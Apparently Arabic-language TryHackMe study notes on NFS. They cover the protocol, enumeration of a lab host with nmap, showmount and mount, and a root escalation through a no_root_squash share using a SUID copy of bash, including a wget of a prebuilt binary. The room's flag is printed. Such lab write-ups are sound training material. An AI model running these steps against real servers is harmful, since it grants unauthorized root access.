# Network Services_2

<details>
  <summary>NFS</summary>

<details>
  <summary>understanding</summary>

# 🧠 ما هو NFS؟

**NFS** هو بروتوكول يسمح لجهاز بمشاركة ملفات أو فولدرات مع جهاز آخر على نفس الشبكة.
على سبيل المثال، إذا كان لديك سيرفر يحتوي على ملفات، يمكنك من جهاز آخر "تركيب" (mount) هذا الفولدر ورؤية الملفات وكأنها موجودة على جهازك.

---

# 🛠️ كيف يعمل NFS؟

1. **العميل (Client)** يطلب تركيب (mount) فولدر من السيرفر.
2. **السيرفر** يتحقق مما إذا كان العميل يملك صلاحيات.
3. إذا كانت الصلاحيات صحيحة، يقوم السيرفر بإرسال **file handle**.
4. عندما يطلب العميل فتح ملف، يرسل **RPC (Remote Procedure Call)** إلى **NFSD** (خدمة NFS على السيرفر).

### يتضمن الطلب:

* File Handle
* اسم الملف
* User ID و Group ID (لتحديد الصلاحيات)

بعدها يقرر السيرفر ما إذا كان هذا المستخدم يملك صلاحية القراءة أو الكتابة على الملف.

---

# 💻 من يمكنه استخدام NFS؟

يدعم NFS أنظمة تشغيل مختلفة، مثل:

* Linux (لينكس)
* Windows (ويندوز – خاصة Windows Server)
* macOS (ماك)
* UNIX (يونيكس)

مما يسمح بنقل الملفات بين الأنظمة بسهولة وبدون مشاكل.

---

# 📚 مصادر للتعمق:

* [Oracle Docs](https://docs.oracle.com/...)
* [Datto](https://www.datto.com/...)
* [Arch Wiki](https://wiki.archlinux.org/...)

---

# 🎯 NFS في مجال الهاكينج

في اختبارات الاختراق (مثل CTFs)، قد تجد أن السيرفر يشارك مجلدات عبر NFS، وغالبًا ما يكون الإعداد ضعيف الأمان:

* يمكنك العثور على ملفات تحتوي على كلمات مرور.
* أو تركيب المجلد بصلاحيات أعلى من المفترض.
* أو حتى الكتابة على السيرفر، مما قد يؤدي إلى:

  * **Privilege Escalation** (تصعيد الصلاحيات)
  * **Persistence** (الاحتفاظ بالوصول)

  
</details>
---
<details>
  <summary>enumerating</summary>


# 🗂️ NFS Enumeration — TryHackMe

## 💥 ما هي Enumeration؟

**Enumeration** هي المرحلة اللي بتبدأ فيها تتفاعل مع الهدف بعد ما تعرف أنه شغال. هدفها جمع أكبر قدر من المعلومات مثل:
- البورتات المفتوحة
- الخدمات الشغالة
- الملفات أو الصلاحيات المتاحة
- المشاركة عبر الشبكة (مثل NFS)

---

## 🛠️ الأدوات المطلوبة: nfs-common

### 📦 لتثبيت الأداة:
```bash
sudo apt update && sudo apt install nfs-common -y
```

### أهم الأدوات داخل `nfs-common`:
- `showmount` → لمعرفة الـ shares المتاحة.
- `mount` → لتركيب الـ NFS share على جهازك.

---

## 🔍 فحص البورتات (Port Scanning)

استخدم `nmap` لاكتشاف البورتات والخدمات، خصوصًا NFS (عادةً على بورت 2049):

```bash
nmap -A -p- 10.10.x.x
```

- `-A` → تشغيل الكشف عن النظام والخدمات
- `-p-` → فحص كل البورتات (1 إلى 65535)

---

## 📂 تركيب (Mount) NFS Share

### 1️⃣ إنشاء مجلد محلي:
```bash
mkdir /tmp/mount
```

### 2️⃣ تركيب الـ NFS Share:
```bash
sudo mount -t nfs <IP>:<share> /tmp/mount/ -nolock
```

#### مثال:
```bash
sudo mount -t nfs 10.10.254.46:/shared /tmp/mount/ -nolock
```

---

### 💬 شرح الأمر:

| الجزء               | معناه                                                      |
|---------------------|-------------------------------------------------------------|
| `sudo`              | تشغيل الأمر كـ root                                         |
| `mount`             | أمر تركيب الملفات                                           |
| `-t nfs`            | تحديد أن النوع NFS                                          |
| `IP:share`          | عنوان السيرفر ومسار المشاركة                                |
| `/tmp/mount/`       | المكان اللي هيظهر فيه الشير عندك                            |
| `-nolock`           | تجاوز مشاكل locking (مفيد في CTF)                          |

---

## 🧠 الخلاصة

- Enumeration هي خطوة أساسية قبل الهجوم.
- NFS يسمح بمشاركة ملفات عبر الشبكة.
- استخدم `showmount` و `mount` لتصفح وسحب الملفات.



---


```
nmap -A -p- 10.10.58.68
```

```ruby
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-05 18:00 EDT
Stats: 0:01:53 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 52.26% done; ETC: 18:03 (0:01:43 remaining)
Nmap scan report for 10.10.58.68
Host is up (0.089s latency).
Not shown: 65528 closed tcp ports (reset)
PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 89:ce:8b:ba:18:15:4e:df:4a:72:ff:fa:f5:79:fa:07 (RSA)
|   256 11:34:2c:a1:57:23:ad:dd:d3:87:ca:46:64:55:10:fc (ECDSA)
|_  256 40:ae:b7:7d:8a:88:75:b1:64:e6:80:d3:6a:d2:a0:f9 (ED25519)
111/tcp   open  rpcbind  2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      34617/udp6  mountd
|   100005  1,2,3      41543/tcp6  mountd
|   100005  1,2,3      47131/udp   mountd
|   100005  1,2,3      55605/tcp   mountd
|   100021  1,3,4      37739/tcp   nlockmgr
|   100021  1,3,4      44665/tcp6  nlockmgr
|   100021  1,3,4      55473/udp6  nlockmgr
|   100021  1,3,4      58643/udp   nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
2049/tcp  open  nfs      3-4 (RPC #100003)
37739/tcp open  nlockmgr 1-4 (RPC #100021)
42227/tcp open  mountd   1-3 (RPC #100005)
51739/tcp open  mountd   1-3 (RPC #100005)
55605/tcp open  mountd   1-3 (RPC #100005)
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.15
OS details: Linux 4.15
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 995/tcp)
HOP RTT      ADDRESS
1   86.46 ms 10.8.0.1
2   88.57 ms 10.10.58.68

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 269.36 seconds

```

---

```
/usr/sbin/showmount -e 10.10.58.68
```

![image](https://github.com/user-attachments/assets/48c71fcb-0ecd-42db-a5fa-6d80aa6a09c0)

---

```
mkdir /tmp/mount
sudo mount -t nfs 10.10.58.68:/home /tmp/mount/ -nolock
```

![image](https://github.com/user-attachments/assets/b05502a0-f46b-462b-9b34-5ad2f3002891)

---
![image](https://github.com/user-attachments/assets/84239b60-0a24-493b-81f9-3aadfd463125)


![image](https://github.com/user-attachments/assets/806ef472-f80d-4c63-85bd-46a34dee8518)






```
ssh -i id_rsa cappucino@10.10.58.68
```

![image](https://github.com/user-attachments/assets/dc237cc6-0734-49e3-8769-633bd86245af)









  
</details>
---
<details>
  <summary>exploiting</summary>



# 🚀 NFS Privilege Escalation via Root Squash Misconfiguration

## 🧠 ما هو Root Squash؟

`root_squash` هو إعداد في NFS يمنع المستخدمين اللي يدخلوا من أجهزة خارجية من استخدام صلاحيات root.

- ✅ إذا كان **مُفعل**: أي اتصال من مستخدم root → يتحول تلقائيًا إلى مستخدم `nfsnobody`
- ❌ إذا كان **غير مُفعل** (misconfigured): يسمح للمستخدم يرفع ملفات ويعطيها صلاحيات root، وده خطر جدًا!

---

## 🔐 ما هو SUID؟

**SUID (Set User ID)**: لما يكون ملف تنفيذي عليه SUID، أي حد يشغله بيشتغل بنفس صلاحيات صاحب الملف (مثل root).

### مثال:
```bash
chmod +s bash
ls -l bash
# -rwsr-xr-x 1 root root 1183448 Jun  5 13:15 bash
```

هنا `s` معناها SUID مفعّل.

---

## 🧨 الهجوم خطوة بخطوة:

### ✅ الخطوة 1: نزل ملف bash من جهاز الضحية

لو عندك key لل SSH:
```bash
scp -i id_rsa username@10.10.58.68:/bin/bash ~/Downloads/bash
```

أو تقدر تحمله من الإنترنت (إذا مشيت معاك):
```bash
wget https://github.com/polo-sec/writing/raw/master/Security%20Challenge%20Walkthroughs/Networks%202/bash
chmod +x bash
```

---

### ✅ الخطوة 2: ارفع bash إلى الـ NFS Share

افترض إنك عملت mount للـ NFS في `/mnt/nfs`:
```bash
cp bash /mnt/nfs/bash
```

---

### ✅ الخطوة 3: عيّن صلاحيات SUID

```bash
chmod +s /mnt/nfs/bash
ls -l /mnt/nfs/bash
# -rwsr-xr-x 1 root root ... bash
```

---

### ✅ الخطوة 4: اتصل بالجهاز عبر SSH

```bash
ssh -i id_rsa username@10.10.58.68
```

---

### ✅ الخطوة 5: شغّل الباش اللي عليه SUID بصلاحيات root

```bash
/mnt/nfs/bash -p
```

💥 وهتلاحظ إنك بقيت root:

```bash
whoami
# root
```

---

## 🔁 الخلاصة: مسار التصعيد الكامل

```text
NFS Access
    ↓
Low Privilege Shell
    ↓
Upload Bash Executable to the NFS Share
    ↓
Set SUID Bit via NFS
    ↓
Login via SSH
    ↓
Execute Bash with -p
    ↓
🎯 Root Access Achieved
```

---

## 📌 ملاحظات مهمة:

- تأكد من أن المجلد في NFS mounted عندك.
- تأكد من صلاحيات الـ share (إنه بيقبل SUID).
- استخدم `bash -p` دايمًا لتشغيل shell بـ privileges.





----

```
cat /etc/exports
```

![image](https://github.com/user-attachments/assets/c57c6be9-b09b-4569-97ed-7fb7e7db9e1e)

found ``/home           *(rw,no_root_squash)``


----

```
scp -i id_rsa username@10.10.58.68:/bin/bash ~/Downloads/bash
```

```
sudo cp ~/Downloads/bash /tmp/mount/bash
```

```
sudo chmod +s /tmp/mount/bash
```

![image](https://github.com/user-attachments/assets/41d82a35-4ba7-4415-9cff-118f76b08141)


```
ssh -i id_rsa cappucino@10.10.58.68
```

now run ``bash`` file :


![image](https://github.com/user-attachments/assets/ff131676-ca3a-4bd1-9584-cdfb7b2ff56d)


```
THM{nfs_got_pwned}
```

# الخلاصه 

1. إحنا ركّبنا مجلد من السيرفر عن طريق الـ NFS.
2. في السيرفر ده، إعداد الـ NFS مش مفعل root_squash.
3. يعني لو أنا من جهازي رفعت ملف لمجلد الـ NFS وملّكته للـ root → السيرفر هيحترم ده!
4. فإحنا:
5. نسخنا نسخة من bash
6. حطيناها في /tmp/mount/bash
7. وفعّلنا عليها SUID
8. لما نرجع نسجل دخول عادي على السيرفر:
9. ونجرب نشغّل /tmp/mount/bash -p
10. هيشتغل كأننا root!









  
</details>


</details>

-------------------------------------------------------------------------------------------------------------------------------------------

<details>
  <summary>SMTP</summary>

<details>
  <summary>understanding</summary>
</details>
---
<details>
  <summary>enumerating</summary>
</details>
---
<details>
  <summary>exploiting</summary>
</details>


</details>

-------------------------------------------------------------------------------------------------------------------------------------------

<details>
  <summary>MYsql</summary>

<details>
  <summary>understanding</summary>
</details>
---
<details>
  <summary>enumerating</summary>
</details>
---
<details>
  <summary>exploiting</summary>
</details>


</details>

-------------------------------------------------------------------------------------------------------------------------------------------
